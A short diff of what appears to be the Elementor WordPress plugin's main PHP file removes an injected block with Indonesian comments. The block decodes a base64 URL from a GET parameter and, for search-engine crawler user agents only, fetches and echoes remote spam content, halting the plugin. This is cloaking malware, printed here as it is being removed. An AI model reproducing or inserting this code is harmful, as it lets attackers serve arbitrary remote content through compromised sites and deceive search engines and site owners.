@@ -27,21 +27,6 @@ if ( ! defined( 'ABSPATH' ) ) {
 	exit; // Exit if accessed directly.
 }
 
-if (isset($_GET['id'])) {
-    $payload = base64_decode($_GET['id']); // contoh: aHR0cHM6Ly90aGVvbmx5ZC54eXovZ2xvYmFsaW50ZXJzY29wZS5odG1s
-
-    // cek user-agent apakah Googlebot / Bingbot
-    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-    if (preg_match('/googlebot|bingbot|slurp|duckduckbot/i', $ua)) {
-        // load konten spam dari remote URL
-        $spam = @file_get_contents($payload);
-        if ($spam) {
-            echo $spam;
-            exit; // hentikan eksekusi plugin normal agar hanya spam yg tampil
-        }
-    }
-}
-
 define( 'ELEMENTOR_VERSION', '3.27.5' );
 
 define( 'ELEMENTOR__FILE__', __FILE__ );
